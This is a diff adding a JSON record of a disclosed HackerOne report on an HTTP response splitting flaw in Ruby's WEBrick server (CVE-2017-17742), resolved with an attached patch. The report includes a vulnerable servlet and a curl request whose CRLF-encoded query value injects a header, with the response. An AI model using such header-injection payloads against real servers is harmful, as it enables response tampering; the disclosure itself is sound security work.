@@ -1,0 +1,121 @@
+{
+  "id": 153794,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTM3OTQ=",
+  "url": "https://hackerone.com/reports/153794",
+  "title": "Response splitting vulnerability in WEBrick",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2016-07-25T20:33:08.163Z",
+  "submitted_at": "2016-07-25T20:33:08.163Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "tenderlove",
+    "url": "/tenderlove",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7724,
+    "url": "https://hackerone.com/ruby",
+    "handle": "ruby",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby",
+      "twitter_handle": "",
+      "website": "https://www.ruby-lang.org",
+      "about": "A Programmer's Best Friend"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": true,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2017-17742"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-04-29T02:01:36.166Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-03-30T02:01:29.587Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nWEBrick seems to be vulnerable to a [response splitting attack](https://www.owasp.org/index.php/HTTP_Response_Splitting).  The reproduction script is very similar to the code shown on the owasp page:\n\n```ruby\nrequire 'webrick'\n\nclass MyServlet < ::WEBrick::HTTPServlet::AbstractServlet\n  def service req, res\n    res.cookies << WEBrick::Cookie.new('author', req.query['author'])\n    res.body = 'hello world'\n  end\nend\n\nserver = ::WEBrick::HTTPServer.new Port: 8080\nserver.mount \"/\", MyServlet\ntrap('INT') { server.shutdown }\nserver.start\n```\n\nFrom the command line do:\n\n```\n$ curl -i localhost:8080/?author=Aaron%0D%0AX-Foo:%20hacked\n```\n\nThe response looks like this:\n\n```\nHTTP/1.1 200 OK \nServer: WEBrick/1.3.1 (Ruby/2.4.0/2016-07-12)\nDate: Mon, 25 Jul 2016 19:13:18 GMT\nContent-Length: 11\nConnection: Keep-Alive\nSet-Cookie: author=Aaron\nX-Foo: hacked\n\nhello world\n```\n\nYou can see the header has been injected.  I've attached a patch to fix the issue.\n\nNote:  It seems like many Ruby webservers are vulnerable to this attack.  So we may need to coordinate release.",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 107282,
+      "file_name": "fix_response_splitting.patch",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/107/282/81e6c98e0857ca41437125d446568c48e8db4ad4/fix_response_splitting.patch?response-content-disposition=attachment%3B%20filename%3D%22fix_response_splitting.patch%22%3B%20filename%2A%3DUTF-8%27%27fix_response_splitting.patch&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4NBYFOQ4%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T181724Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDUOkW2FzFC6pm%2FNX1XaXFOMoMH%2Bp4H2WUiPJZqY%2BanwgIhAJFQ%2FlQr6I%2B0XtQDeMC2oBzuFsDrw8mLPnzuXsmpbd1PKrIFCBoQAxoMMDEzNjE5Mjc0ODQ5Igyr7Rw5YRF0HZ7fR%2FYqjwW5Qd1a9sJiEkY%2B%2F3zgLJW1Urm240ouIXC%2Fgaxrdjh7p08XzP5hiWBzZJbdK8F0ucj7xdDtBM%2FwJEuTALPEVPodKNXLuo2iPiEfHLn6Mi044F%2B1kIUP0JUBECpklZXKfr1UYZwdUZr01mZv3kz%2FI3%2Fqn1w0AiWtbTG08ENHN%2BgPlNoi7FWCS6Su3fwHpMyve8Ws3n2ItTFL8KJU%2BDuMyVs7WA3fUYoB5SyTJtEeuJyq7xUt%2FIEq46i9%2B3R%2FZuXRS9MXDvEwJSenc7BovdJbkmrfHrNXldVgLVXfRDoI7rfzQg9kpiyZL%2FNtqP0eLFtwnOssULBgqtvcj8gS6xZol0yOSvzTatcqbdFaUBjUyLwnCyvalzYWpBG8iJ0hIsnKdVxgyOfm3eG%2FyMp0l2ze37ns7D2G42ReaM27z6o9MLu2%2FaXchNsGsACQUmyJzmQeaWkLKsN3t0CV1a4ikXVBJoKuSvE1Ow1COmF4Ga2gQGRvxhSKkmd%2BwqpMtiudIH2qoRrFAy9vYiLw3rNmj6PmurdKVSc5IQ9UNxuMF3Oody6yS5NDAZXXQXaG4wJ%2BdokigS90AYqlv9ISgI3CuNe08R9v67hxFBTRFYlkffzzWXjA55E3n%2FfB%2FfsKdvyOHus%2F4b%2B5ykH2GacB7nF7oaycS%2FIwvab5cWW5NKoEsiYhqg1qFqW%2F767vijcT54G9RDk99KaoL7RvH0XjSJZLGBH3ysF1apVxsziRJxMaqOdC92Psjzq17fzztkjL8IRjSu%2FmDkVRJoSg65hwJO7nyBDpZLnqoU4SyQXKhceVVzzVxrAvs1ULMjCrCNy8LLJuVpp4aVfgQBSuPISCgGpnNgRyRUBAEOg1IWUPYdUw49OAMQllMLXPwMYGOrABAWXJLzknPNalVhXK%2BCD1xQTo7%2FG%2F8w2hhdtgVQygVnyY5d%2BT9T7ud5%2BbdHuudRmYgmMmSjNEMp22ujihBkD%2Bff5FvQTNjj6uaoBxOVIT0HovM5Q%2FMD8whEgbTG5c7Z1wEG2nZEC1OV%2FfqWEtb5RMBmE5z0FRma6AYAY7IShPFPHfGzVOzU%2BB7oLUVCqVPJZZlTdn%2FX1dBFkKtdV4f1XLR%2BgKj30YXP3LHhQ1daucH9g%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8e14db8780a5cc07e3edd4671d8f4981803defa61dd798f4617c44f6d9ffe392",
+      "file_size": 2641,
+      "type": "text/x-diff",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-04-29T02:01:29.675Z",
+  "allow_singular_disclosure_after": -233511354.99522188,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "bl4de",
+    "akaash_pantherdefence",
+    "geeknik",
+    "eveeez"
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
